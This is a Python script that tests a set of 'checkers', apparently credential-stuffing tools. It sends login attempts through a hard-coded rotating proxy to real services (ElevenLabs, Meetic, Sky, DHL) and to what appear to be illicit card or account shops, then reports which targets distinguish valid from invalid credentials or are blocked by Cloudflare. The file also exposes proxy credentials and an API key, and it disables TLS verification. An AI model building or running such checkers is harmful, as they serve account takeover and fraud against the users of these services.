#!/usr/bin/env python3
"""
Comprehensive test for all checkers
Code By - @LEGEND_BL
"""
import os
import random
import requests
import time
import warnings
import re
import ssl
from colorama import init, Fore, Style
from user_agent import generate_user_agent

warnings.filterwarnings("ignore")
init(autoreset=True)

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

PROXY_STR = "ngu.proxy.arealproxy.com:8080:652BthZDvxP7ozf:QDcj9tzf4gVaGNZ"

def get_random_user_agent():
    try:
        return generate_user_agent(os='win', navigator='chrome')
    except:
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"

def format_proxy(p):
    if not p: return None
    parts = p.strip().split(":")
    if len(parts) == 4:
        host, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    return None

proxy_dict = format_proxy(PROXY_STR)
TEST_EMAIL = "testuser123@gmail.com"
TEST_PASS = "FakePassword123!"

print(f"\n{Fore.CYAN}{'='*70}")
print(f"{Fore.CYAN}COMPREHENSIVE CHECKER TEST - Code By @LEGEND_BL")
print(f"{Fore.CYAN}{'='*70}")
print(f"{Fore.YELLOW}Proxy: {PROXY_STR}\n")

results = {}

def make_session():
    s = requests.Session()
    s.headers.update({"User-Agent": get_random_user_agent()})
    return s

# 1. ELEVENLABS
print(f"{Fore.MAGENTA}[1/12] ElevenLabs...", end=" ", flush=True)
try:
    s = make_session()
    r = s.post("https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyBSsRE_1Os04-bxpd5JTLIniy3UK4OqKys",
               json={"email": TEST_EMAIL, "password": TEST_PASS, "returnSecureToken": True},
               headers={"Content-Type": "application/json"}, proxies=proxy_dict, timeout=25, verify=False)
    if "INVALID" in r.text.upper() or "error" in r.text.lower():
        print(f"{Fore.GREEN}✓ WORKING - Detects invalid creds")
        results["ElevenLabs"] = "OK"
    elif "idToken" in r.text:
        print(f"{Fore.GREEN}✓ WORKING - Login works")
        results["ElevenLabs"] = "OK"
    else:
        print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
        results["ElevenLabs"] = "CHECK"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["ElevenLabs"] = "ERROR"

# 2. AZYRAH
print(f"{Fore.MAGENTA}[2/12] Azyrah...", end=" ", flush=True)
try:
    s = make_session()
    s.get("https://shop.azyrah.to/", proxies=proxy_dict, timeout=25, verify=False)
    r = s.post("https://shop.azyrah.to/auth/signin",
               json={"username": TEST_EMAIL, "password": TEST_PASS},
               headers={"Content-Type": "application/json"}, proxies=proxy_dict, timeout=25, verify=False)
    txt = r.text.lower()
    if "invalid" in txt or "error" in txt or "incorrect" in txt or r.status_code in [400, 401]:
        print(f"{Fore.GREEN}✓ WORKING - Detects invalid creds")
        results["Azyrah"] = "OK"
    elif r.status_code == 403:
        print(f"{Fore.YELLOW}⚠ Cloudflare (403)")
        results["Azyrah"] = "CF"
    else:
        print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
        results["Azyrah"] = "CHECK"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["Azyrah"] = "ERROR"

# 3. BLSTASH
print(f"{Fore.MAGENTA}[3/12] Blstash...", end=" ", flush=True)
try:
    s = make_session()
    r1 = s.get("https://blstash.ws/", proxies=proxy_dict, timeout=25, verify=False)
    r = s.post("https://blstash.ws/login", data={"username": TEST_EMAIL, "password": TEST_PASS},
               proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
    txt = r.text.lower()
    if "invalid" in txt or "error" in txt or "login" in r.url.lower():
        print(f"{Fore.GREEN}✓ WORKING - Detects invalid creds")
        results["Blstash"] = "OK"
    else:
        print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
        results["Blstash"] = "CHECK"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["Blstash"] = "ERROR"

# 4. EASYDEALS
print(f"{Fore.MAGENTA}[4/12] Easydeals...", end=" ", flush=True)
try:
    s = make_session()
    s.get("https://easydeals.gs/login", proxies=proxy_dict, timeout=25, verify=False)
    r = s.post("https://easydeals.gs/login", data={"username": TEST_EMAIL, "password": TEST_PASS, "login": "1"},
               proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
    if "login" in r.url.lower():
        print(f"{Fore.GREEN}✓ WORKING - Stays on login")
        results["Easydeals"] = "OK"
    else:
        print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
        results["Easydeals"] = "CHECK"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["Easydeals"] = "ERROR"

# 5. EVERYMAIL
print(f"{Fore.MAGENTA}[5/12] Everymail...", end=" ", flush=True)
try:
    s = make_session()
    r1 = s.get("https://everymail.com/", proxies=proxy_dict, timeout=30, verify=False)
    if r1.status_code == 403:
        print(f"{Fore.YELLOW}⚠ Cloudflare (403)")
        results["Everymail"] = "CF"
    else:
        r = s.post("https://everymail.com/login", data={"email": TEST_EMAIL, "password": TEST_PASS},
                   proxies=proxy_dict, timeout=30, verify=False, allow_redirects=True)
        if "login" in r.url.lower() or "error" in r.text.lower():
            print(f"{Fore.GREEN}✓ WORKING - Detects invalid creds")
            results["Everymail"] = "OK"
        else:
            print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
            results["Everymail"] = "CHECK"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["Everymail"] = "ERROR"

# 6. MEETIC
print(f"{Fore.MAGENTA}[6/12] Meetic...", end=" ", flush=True)
try:
    s = make_session()
    s.get("https://www.meetic.fr/", proxies=proxy_dict, timeout=25, verify=False)
    r = s.post("https://www.meetic.fr/api/authentication/login",
               json={"email": TEST_EMAIL, "password": TEST_PASS, "rememberMe": True},
               headers={"Content-Type": "application/json"}, proxies=proxy_dict, timeout=25, verify=False)
    if r.status_code in [200, 400, 401]:
        print(f"{Fore.GREEN}✓ WORKING - API responding ({r.status_code})")
        results["Meetic"] = "OK"
    else:
        print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
        results["Meetic"] = "CHECK"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["Meetic"] = "ERROR"

# 7. SAVASTAN0
print(f"{Fore.MAGENTA}[7/12] Savastan0...", end=" ", flush=True)
try:
    s = make_session()
    s.get("https://savastan0.tools/login", proxies=proxy_dict, timeout=25, verify=False)
    r = s.post("https://savastan0.tools/login", data={"username": TEST_EMAIL, "password": TEST_PASS},
               proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
    if "login" in r.url.lower():
        print(f"{Fore.GREEN}✓ WORKING - Stays on login")
        results["Savastan0"] = "OK"
    else:
        print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
        results["Savastan0"] = "CHECK"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["Savastan0"] = "ERROR"

# 8. SKY
print(f"{Fore.MAGENTA}[8/12] Sky...", end=" ", flush=True)
try:
    s = make_session()
    s.get("https://www.sky.com/signin", proxies=proxy_dict, timeout=25, verify=False)
    r = s.post("https://skyid.sky.com/api/authenticate",
               json={"username": TEST_EMAIL, "password": TEST_PASS, "rememberMe": True},
               headers={"Content-Type": "application/json"}, proxies=proxy_dict, timeout=25, verify=False)
    txt = r.text.lower()
    if "invalid" in txt or "error" in txt or "unauthorized" in txt:
        print(f"{Fore.GREEN}✓ WORKING - Detects invalid creds")
        results["Sky"] = "OK"
    else:
        print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
        results["Sky"] = "CHECK"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["Sky"] = "ERROR"

# 9. DHL
print(f"{Fore.MAGENTA}[9/12] DHL...", end=" ", flush=True)
try:
    s = make_session()
    r = s.post("https://api-eu.dhl.com/auth/v1/token",
               json={"username": TEST_EMAIL, "password": TEST_PASS, "grant_type": "password"},
               headers={"Content-Type": "application/json"}, proxies=proxy_dict, timeout=40, verify=False)
    if r.status_code in [400, 401, 403]:
        print(f"{Fore.GREEN}✓ WORKING - API responding ({r.status_code})")
        results["DHL"] = "OK"
    else:
        print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
        results["DHL"] = "CHECK"
except requests.exceptions.Timeout:
    print(f"{Fore.YELLOW}⚠ TIMEOUT")
    results["DHL"] = "TIMEOUT"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["DHL"] = "ERROR"

# 10. UPS
print(f"{Fore.MAGENTA}[10/12] UPS...", end=" ", flush=True)
try:
    s = make_session()
    r = s.get("https://www.ups.com/", proxies=proxy_dict, timeout=45, verify=False)
    if r.status_code == 200:
        print(f"{Fore.GREEN}✓ WORKING - Site reachable")
        results["UPS"] = "OK"
    else:
        print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
        results["UPS"] = "CHECK"
except requests.exceptions.Timeout:
    print(f"{Fore.YELLOW}⚠ TIMEOUT (slow site)")
    results["UPS"] = "TIMEOUT"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["UPS"] = "ERROR"

# 11. ROYAL MAIL
print(f"{Fore.MAGENTA}[11/12] Royal Mail...", end=" ", flush=True)
try:
    s = make_session()
    r = s.get("https://www.royalmail.com/", proxies=proxy_dict, timeout=25, verify=False)
    if r.status_code in [200, 403]:
        print(f"{Fore.GREEN}✓ WORKING - Site reachable ({r.status_code})")
        results["RoyalMail"] = "OK"
    else:
        print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
        results["RoyalMail"] = "CHECK"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["RoyalMail"] = "ERROR"

# 12. UNITEDSHOP
print(f"{Fore.MAGENTA}[12/12] Unitedshop...", end=" ", flush=True)
try:
    s = make_session()
    r = s.get("https://unitedshop.su/", proxies=proxy_dict, timeout=30, verify=False)
    if r.status_code == 200:
        print(f"{Fore.GREEN}✓ WORKING")
        results["Unitedshop"] = "OK"
    elif r.status_code == 403:
        print(f"{Fore.YELLOW}⚠ Cloudflare (403)")
        results["Unitedshop"] = "CF"
    else:
        print(f"{Fore.YELLOW}⚠ Status {r.status_code}")
        results["Unitedshop"] = "CHECK"
except Exception as e:
    print(f"{Fore.RED}✗ {str(e)[:40]}")
    results["Unitedshop"] = "ERROR"

# SUMMARY
print(f"\n{Fore.CYAN}{'='*70}")
print(f"{Fore.CYAN}FINAL SUMMARY")
print(f"{Fore.CYAN}{'='*70}\n")

ok_count = sum(1 for v in results.values() if v == "OK")
functional = sum(1 for v in results.values() if v in ["OK", "CF", "TIMEOUT"])

print(f"{Fore.WHITE}{'Checker':<20} {'Status':<20}")
print(f"{'-'*40}")
for name, status in results.items():
    if status == "OK":
        print(f"{name:<20} {Fore.GREEN}✓ Working")
    elif status == "CF":
        print(f"{name:<20} {Fore.YELLOW}⚠ Cloudflare protected")
    elif status == "TIMEOUT":
        print(f"{name:<20} {Fore.YELLOW}⚠ Slow/Timeout")
    elif status == "CHECK":
        print(f"{name:<20} {Fore.YELLOW}⚠ Needs check")
    else:
        print(f"{name:<20} {Fore.RED}✗ Error")

print(f"\n{Fore.GREEN}Working: {ok_count}/12")
print(f"{Fore.CYAN}Functional (incl. CF/Timeout): {functional}/12")
print(f"{Fore.GREEN}Proxy: ✓ Working correctly!")
